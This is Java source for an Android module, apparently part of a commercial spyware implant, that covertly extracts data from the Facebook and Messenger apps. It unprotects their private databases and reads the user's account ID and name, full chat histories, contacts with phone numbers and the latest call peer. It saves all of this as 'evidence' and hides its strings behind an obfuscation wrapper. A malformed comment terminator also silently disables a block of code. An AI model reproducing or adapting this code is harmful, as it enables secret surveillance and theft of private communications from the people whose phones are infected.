package com.android.dvci.module.chat;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

import android.database.Cursor;

import com.android.dvci.auto.Cfg;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordHashPairVisitor;
import com.android.dvci.db.RecordHashtableIdVisitor;
import com.android.dvci.db.RecordListVisitor;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.file.Path;
import com.android.dvci.module.ModuleAddressBook;
import com.android.dvci.module.call.CallInfo;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

public class ChatFacebook extends SubModuleChat {

	private static final String TAG = "ChatFacebook";

	private static final int PROGRAM = 0x02;
	String pObserving = M.e("com.facebook.");

	private Date lastTimestamp;

	private Hashtable<String, Long> lastFb;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	// private String dbDir;
	private static String account_uid;
	private static String account_name;
	private static String phone_number;
	private static String phone_confirmed;


	static String dirKatana = M.e("/data/data/com.facebook.katana/databases");
	static String dirOrca = M.e("/data/data/com.facebook.orca/databases");

	private Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();


	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (processName.contains(M.e("katana")))
			fetchFb(dirKatana);
		else if (processName.contains(M.e("orca")))
			fetchFb(dirOrca);
	}

	@Override
	protected void start() {
		lastFb = markup.unserialize(new Hashtable<String, Long>());
		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastFb: " + lastFb);
		}

		if (!fetchFb(dirOrca)) {
			fetchFb(dirKatana);
		}
		//getCurrentCall(new CallInfo(false));
	}

	static public void getAccountInfo() {
		if (!readMyAccount(dirOrca)) {
			readMyAccount(dirKatana);
		}
	}
	private boolean fetchFb(String dir) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchFb) " + dir);
		}
		if (readMyAccount(dir)) {
			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.FACEBOOK, account_uid, account_name);
			readFbMessageHistory(dir);
			return true;
		}
		return false;
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	static public String getPhone_number() {
		return phone_number;
	}

	private static boolean readMyAccount(String dbDir) {

		String dbFile = M.e("prefs_db");

		if (!Path.unprotect(dbDir + "/" + dbFile, 3, false)) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyAccount) cannot unprotect file: %s/%s", dbDir, dbFile);
			}
			return false;
		}

		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyAccount) Error: cannot open " + dbDir + "/" + dbFile);
			}
			return false;
		}
		try {
			String selection = null;

			RecordHashPairVisitor visitor = new RecordHashPairVisitor("key", "value");
			helper.traverseRecords(M.e("preferences"), visitor);

			Hashtable<String, String> preferences = visitor.getMap();

			account_uid = preferences.get(M.e("/auth/user_data/fb_uid"));
			account_name = preferences.get(M.e("/auth/user_data/fb_username"));
			phone_number = account_name;
			/* are we interested to the phone registration number?
			phone_number = preferences.get(M.e("/config/neue/validated_phonenumber"));
			phone_confirmed = preferences.get(M.e("/config/neue/phone_confirmed"));
			* /


			if (StringUtils.isEmpty(account_name)) {
				String account_user = preferences.get(M.e("/auth/user_data/fb_me_user"));
				try {
					JSONObject root = (JSONObject) new JSONTokener(account_user).nextValue();

					account_uid = root.getString("uid");
					account_name = root.getString("name");
				} catch (JSONException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyAccount) Error: " + e);
					}
				}
			}
			/* are we interested to the phone registration number?
			if(StringUtils.isEmpty(phone_number)){
				phone_number = account_name;
			}
			*/
			return (!StringUtils.isEmpty(account_name) && !StringUtils.isEmpty(account_uid));
		}finally{
			helper.disposeDb();
		}

	}

	public static boolean getCurrentCall( final CallInfo callInfo) {
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				Long timestamp = cursor.getLong(1);
				callInfo.id=Math.abs(timestamp.hashCode());
				if (callInfo.valid == false) {
					callInfo.peer = "unknown";
					int msg_type = cursor.getInt(0);

					if (msg_type == 100 || msg_type == 102) {
						String participants = cursor.getString(2);

						try {
							JSONArray parts = (JSONArray) new JSONTokener(participants).nextValue();
							if (parts != null) {
								for (int i = parts.length() - 1; i >= 0; i--) {
									JSONObject p = parts.getJSONObject(i);
									if (p != null && p.getString(M.e("user_key")) != null) {
										String user_key = p.getString(M.e("user_key"));
										if (user_key.split(":").length < 2)
											continue;
										user_key = user_key.split(":")[1];
										if (Cfg.DEBUG) {
											Check.log(TAG + " (getCurrentCall) Checking \"" + user_key +"\" against \"" + account_uid + "\"" );
										}
										if (!user_key.equalsIgnoreCase(account_uid)) {
											if (Cfg.DEBUG) {
												Check.log(TAG + " (getCurrentCall) differs !" );
											}
											/* found peer */
											if (p.getString(M.e("name")) != null) {
												callInfo.peer = p.getString(M.e("name"));
											}
											break;
										}else{
											if (Cfg.DEBUG) {
												Check.log(TAG + " (getCurrentCall) is equal !" );
											}
										}
									}
								}
							}
						} catch (Exception e) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (getCurrentCall) Error: " + e);
							}
						}
						callInfo.account = account_name;
						// ok we found the last valid call, mark as valid to avoid the other.
						callInfo.timestamp = new Date(timestamp);
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getCurrentCall) call type: " + msg_type);
						}
						callInfo.incoming = msg_type == 100;
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getCurrentCall) incoming: " + callInfo.incoming + " timestamp=" + timestamp);
						}
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getCurrentCall) user: " + callInfo.account + " account_id:" + account_uid + " peer: " + callInfo.peer + " timestamp:" + timestamp);
						}
						callInfo.valid = true;
					}
				}
				return callInfo.id;
			}
		};
		callInfo.valid = false;
		String dbDir;
		if (Path.unprotectAll(dirOrca, true)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getCurrentCall) db dir id %s", dirOrca);
			}
			dbDir = dirOrca;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getCurrentCall) cannot access db directory");
			}
			return false;
		}

		String dbFile1 = M.e("threads_db");
		String dbFile2 = M.e("threads_db2");

		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile1);
		if (helper == null) {
			helper = GenericSqliteHelper.open(dbDir, dbFile2);
		}
		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getCurrentCall) Error: null helper, dbFileNot available");
			}
			return false;
		}

		String sqlQuery = M.e("select m.msg_type, m.timestamp_ms, t.participants from messages as m join threads as t on t.thread_key=m.thread_key" +
				" where (m.msg_type = 100 or m.msg_type = 102 ) and m.timestamp_ms > 0 order by m.timestamp_ms desc limit 1  ");
		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
		helper.disposeDb();
		return callInfo.valid;
	}
	private void readFbMessageHistory(String dbDir) {
		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readFbMessageHistory), semaphore red");
			}
			return;
		}

		try {
			boolean updateMarkup = false;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readFbMessageHistory) account: " + account_uid + " dir: " + dbDir);
			}

			Path.unprotectAll(dbDir, true);

			if (ModuleAddressBook.getInstance() != null) {
				if (Path.unprotect(dbDir, M.e("users_db2"), true)) {
					readAddressUser(dbDir);

				} else if (Path.unprotect(dbDir, M.e("contacts_db2"), true)) {
					readAddressContacts(dbDir);
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readFbMessageHistory) AddressBook not enabled.");
				}
			}

			String dbFile1 = M.e("threads_db");
			String dbFile2 = M.e("threads_db2");

			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile1);
			if (helper == null) {
				helper = GenericSqliteHelper.open(dbDir, dbFile2);
			}
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getFbConversations) Error: null helper");
				}
				return;
			}
			try{
				try {
					readFB(helper, M.e("thread_id"));
					return;
				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readFbMessageHistory) Error: " + ex);
					}
				}
				
				try {
					readFB(helper, "thread_key");
					return;
					
				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readFbMessageHistory) Error: " + ex);
					}
				}
		
			} finally{
				helper.disposeDb();
			}
		} finally {
			readChatSemaphore.release();
		}

	}

	private void readFB(GenericSqliteHelper helper, String field_id) {
		List<FbConversation> conversations = getFbConversations(field_id, helper, account_uid);
		for (FbConversation conv : conversations) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readFbMessageHistory) conversation: " + conv.id);
			}
			long lastConvId = lastFb.containsKey(conv.id) ? lastFb.get(conv.id) : 0;
			if (lastConvId < conv.timestamp) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readFbMessageHistory) lastConvId(" + lastConvId + ") < conv.timestamp("
							+ conv.timestamp + ")");
				}
				long lastReadId = (long) fetchMessages(field_id, helper, conv, lastConvId);

				if (lastReadId > 0) {
					updateMarkupFb(conv.id, lastReadId, true);
				}
			}
		}
	}

	private long fetchMessages(String id_field, GenericSqliteHelper helper, final FbConversation conv, long lastConvId) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String[] projection = new String[] { M.e("text"), M.e("sender"), M.e("timestamp_ms") };
		String selection = String.format(id_field + M.e(" = '%s' and text != '' and timestamp_ms > %s"), conv.id,
				lastConvId);
		String order = M.e("timestamp_ms");

		RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
			@Override
			public long cursor(Cursor cursor) {

				long timestamp = 0;
				try {
					String body = cursor.getString(0);
					String sender = cursor.getString(1);

					JSONObject root = (JSONObject) new JSONTokener(sender).nextValue();
					String peer = root.getString(M.e("email")).split("@")[0];
					String name = root.getString(M.e("name"));

					// localtime or gmt? should be converted to gmt
					timestamp = cursor.getLong(2);
					Date date = new Date(timestamp);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) sc.account: " + conv.account + " peer: " + peer + " body: " + body
								+ " timestamp:" + timestamp);
					}

					boolean incoming = !(peer.equals(conv.account));

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) incoming: " + incoming);
					}

					String from, to = null;
					String fromDisplay, toDisplay = null;

					from = peer;
					fromDisplay = name;

					to = conv.getTo(peer);
					toDisplay = conv.getDisplayTo(peer);

					if (!StringUtils.isEmpty(body)) {
						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
								body, incoming);

						messages.add(message);
					}

				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (fetchMessages) Error: " + ex);
					}
				}
				return timestamp;

			}
		};

		long newLastId = helper.traverseRecords(M.e("messages"), visitor);

		if (messages != null && messages.size() > 0) {
			saveEvidence(messages);
		}

		return newLastId;
	}

	private void updateMarkupFb(String threadId, long newLastId, boolean serialize) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupFb), mailStore: " + threadId + " +lastId: " + newLastId);
		}

		lastFb.put(threadId, newLastId);
		try {
			if (serialize || (newLastId % 10 == 0)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateMarkupFb), write lastId: " + newLastId);
				}
				markup.writeMarkupSerializable(lastFb);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupFb) Error: " + e);
			}
		}
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

	private List<FbConversation> getFbConversations(String id_field, GenericSqliteHelper helper, final String account) {
		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getFbConversations) Error: null helper");
			}
			return null;
		}

		final List<FbConversation> conversations = new ArrayList<FbConversation>();

		// "thread_id"
		String[] projection = new String[] { id_field, M.e("participants"), M.e("timestamp_ms") };
		String selection = M.e("timestamp_ms > 0 ");

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				FbConversation c = new FbConversation();
				c.account = account;
				c.id = cursor.getString(0);

				String value = cursor.getString(1);
				c.timestamp = cursor.getLong(2);
				Contact[] contacts;
				try {
					contacts = json2Contacts(value);
					c.contacts = contacts;
					if (Cfg.DEBUG) {
						// Check.log(TAG + " (cursor) contacts: " +
						// contacts[0].name + " -> " + contacts[1].name);
					}
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				conversations.add(c);
				return 0;
			}
		};

		helper.traverseRecords(M.e("threads"), visitor);
		return conversations;
	}

	private void readAddressUser(String dbDir) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readAddressUser) ");
		}
		String dbFile = M.e("users_db2");
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		// SQLiteDatabase db = helper.getReadableDatabase();

		String[] projection = StringUtils.split( M.e("fbid,first_name,last_name,name,email_addresses,phone_numbers") );
		String selection = null;

		RecordHashtableIdVisitor visitor = new RecordHashtableIdVisitor(projection);
		helper.traverseRecords("facebook_user", visitor);

	}

	private void readAddressContacts(String dbDir) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readAddressContacts) ");
		}
		String dbFile = M.e("contacts_db2");
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		// SQLiteDatabase db = helper.getReadableDatabase();

		RecordListVisitor visitor = new RecordListVisitor("data");
		helper.traverseRecords(M.e("contacts"), visitor);
		boolean serializeContacts = false;
		for (String value : visitor.getList()) {
			try {
				Contact contact = json2Contact(value);
				serializeContacts |= ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.FACEBOOK, contact);
				contacts.put(contact.id, contact);
			} catch (JSONException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts) Error: " + e);
				}
			}
		}
		if (serializeContacts) {
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}

	private Contact json2Contact(String value) throws JSONException {
		JSONObject root = (JSONObject) new JSONTokener(value).nextValue();
		String fbId = root.getString(M.e("profileFbid"));
		JSONObject name = root.getJSONObject(M.e("name"));
		String fullName = name.getString(M.e("displayName"));

		JSONArray phones = root.getJSONArray(M.e("phones"));
		String numbers = "";
		for (int i = 0; i < phones.length(); i++) {
			numbers += phones.getJSONObject(i).get(M.e("universalNumber")) + " ";
		}
		// String picture = root.getString("bigPictureUrl");
		Contact contact = new Contact(fbId, numbers, fullName, "Id: " + fbId);
		return contact;
	}

	private Contact[] json2Contacts(String value) throws JSONException {
		JSONArray jcontacts = (JSONArray) new JSONTokener(value).nextValue();

		Contact[] contacts = new Contact[jcontacts.length()];
		for (int i = 0; i < jcontacts.length(); i++) {

			JSONObject root = (JSONObject) jcontacts.get(i);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (json2Contacts) root: " + root);
			}

			String email = root.getString(M.e("email"));
			String fbId = email.split("@")[0];

			String fullName = root.getString(M.e("name"));

			Contact contact = new Contact(fbId, "", fullName, M.e("Id: ") + fbId);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (json2Contacts) " + contact);
			}
			contacts[i] = contact;
		}
		return contacts;
	}
}
